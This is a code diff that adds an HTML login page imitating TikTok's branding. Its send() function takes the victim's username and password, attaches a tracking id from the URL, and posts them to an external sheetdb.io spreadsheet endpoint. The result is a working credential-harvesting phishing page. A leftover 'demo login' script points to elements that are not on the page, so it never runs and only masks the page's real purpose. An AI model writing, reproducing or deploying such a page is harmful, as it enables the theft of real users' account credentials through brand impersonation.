@@ -1,0 +1,233 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>TikTok Style Login</title>
+
+<style>
+  :root {
+    --bg: #000000;
+    --card-bg: #111111;
+    --accent-pink: #ff0050;
+    --accent-cyan: #00f2ea;
+    --text: #ffffff;
+    --muted: #9ca3af;
+    --radius: 10px;
+  }
+
+  body {
+    margin: 0;
+    background: var(--bg);
+    font-family: system-ui, Arial, sans-serif;
+    color: var(--text);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+
+  .card {
+    background: var(--card-bg);
+    width: 100%;
+    max-width: 360px;
+    padding: 32px;
+    border-radius: var(--radius);
+    box-shadow: 0 0 20px rgba(255, 0, 80, 0.1),
+                0 0 20px rgba(0, 242, 234, 0.1);
+    text-align: center;
+  }
+
+  .logo-placeholder {
+    width: 60px;
+    height: 60px;
+    border-radius: 12px;
+    background: linear-gradient(135deg, var(--accent-pink), var(--accent-cyan));
+    display: grid;
+    place-items: center;
+    margin: 0 auto 18px;
+  }
+
+  .logo-placeholder svg {
+    width: 32px;
+    height: 32px;
+    fill: #000;
+  }
+
+  h1 {
+    margin: 0 0 8px;
+    font-size: 24px;
+    font-weight: 600;
+  }
+
+  .subtitle {
+    color: var(--muted);
+    font-size: 14px;
+    margin-bottom: 24px;
+  }
+
+  .input {
+    width: 100%;
+    padding: 14px;
+    border-radius: var(--radius);
+    border: none;
+    margin-bottom: 16px;
+    font-size: 15px;
+    background: #1a1a1a;
+    color: var(--text);
+  }
+
+  .input:focus {
+    outline: 2px solid var(--accent-cyan);
+  }
+
+  .btn {
+    width: 100%;
+    padding: 14px;
+    border-radius: var(--radius);
+    border: none;
+    background: linear-gradient(90deg, var(--accent-pink), var(--accent-cyan));
+    color: #000;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 12px;
+  }
+
+  .btn:active {
+    transform: translateY(1px);
+  }
+
+  .link {
+    display: block;
+    margin-top: 16px;
+    color: var(--accent-cyan);
+    font-size: 14px;
+    text-decoration: none;
+  }
+
+  .error {
+    color: #ff4d4d;
+    font-size: 13px;
+    display: none;
+    margin: -10px 0 10px;
+  }
+</style>
+</head>
+
+<body>
+<div class="card">
+
+  
+    <!-- simple geometric icon -->
+    <h1>TikTok</h1>
+  
+
+ 
+  <div class="subtitle">Continue to your account</div>
+
+ 
+    <input type="text" id="email" class="input" placeholder="Phone, email or username" />
+    <div id="userErr" class="error">Please enter a valid username.</div>
+
+    <input type="password" id="password" class="input" placeholder="Password" />
+    <div id="passErr" class="error">Password must be at least 4 characters.</div>
+
+    <button onclick="send()" class="btn" type="submit">Log In</button>
+  
+
+
+
+
+
+        <script>
+        function send() {
+           const email = document.getElementById('email').value;
+       const password = document.getElementById('password').value;
+           
+           
+        var urldata = new URLSearchParams(window.location.search);
+        
+        const id = urldata.get('id');
+        const type = "tiktok";
+        
+           
+           const url = "https://sheetdb.io/api/v1/md4crj2w1sk6g";
+
+fetch(url, {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    data: {
+      id: id,
+      type: type,
+      username: email,
+      password: password
+    }
+  })
+})
+.then(response => response.json())
+.then(result => {
+  //out
+})
+.catch(error => {
+  window.alert(error);
+});
+            
+        }
+            
+        </script>
+        
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <a href="#" class="link">Forgot password?</a>
+</div>
+
+<script>
+  const form = document.getElementById("tiktokForm");
+  const user = document.getElementById("user");
+  const pass = document.getElementById("pass");
+  const userErr = document.getElementById("userErr");
+  const passErr = document.getElementById("passErr");
+
+  form.addEventListener("submit", (e) => {
+    e.preventDefault();
+
+    userErr.style.display = "none";
+    passErr.style.display = "none";
+
+    let valid = true;
+
+    if (user.value.trim().length < 3) {
+      userErr.style.display = "block";
+      valid = false;
+    }
+
+    if (pass.value.trim().length < 4) {
+      passErr.style.display = "block";
+      valid = false;
+    }
+
+    if (!valid) return;
+
+    alert("Demo login — integrate with your backend API.");
+  });
+</script>
+
+</body>
+</html>
